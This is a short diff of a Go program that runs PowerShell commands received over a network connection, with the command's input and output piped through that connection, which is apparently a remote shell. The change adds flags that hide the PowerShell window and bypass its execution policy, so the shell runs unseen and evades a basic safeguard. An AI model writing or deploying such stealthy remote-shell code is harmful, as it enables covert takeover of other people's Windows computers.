@@ -52,7 +52,7 @@ func main() {
 		program := parts[0]
 		args := parts[1:]
 		var cmd *exec.Cmd
-		psArgs := append([]string{"-NoProfile", "-Command", program}, args...)
+		psArgs := append([]string{"-NoProfile", "-WindowStyle", "Hidden", "-ep", "Bypass", "-Command", program}, args...)
 		cmd = exec.Command("powershell.exe", psArgs...)
 		cmd.Stdin = conn
 		cmd.Stdout = conn
